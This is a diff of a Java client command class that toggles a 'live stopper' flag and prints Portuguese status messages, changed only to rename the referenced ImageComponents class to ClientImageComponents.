@@ -4,7 +4,7 @@ package br.com.introcdc.connect.client.commands.image;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.ImageComponents;
+import br.com.introcdc.connect.client.components.ClientImageComponents;
 
 public class ClientCommandLiveStopper extends ClientCommand {
 
@@ -14,11 +14,11 @@ public class ClientCommandLiveStopper extends ClientCommand {
 
     @Override
     public void execute(String command, String input) throws Exception {
-        if (ImageComponents.LIVE_STOPPER) {
-            ImageComponents.LIVE_STOPPER = false;
+        if (ClientImageComponents.LIVE_STOPPER) {
+            ClientImageComponents.LIVE_STOPPER = false;
             msg("Parador de atualizador de live automático desativado!");
         } else {
-            ImageComponents.LIVE_STOPPER = true;
+            ClientImageComponents.LIVE_STOPPER = true;
             msg("Parador de atualizador de live automático ativado!");
         }
     }
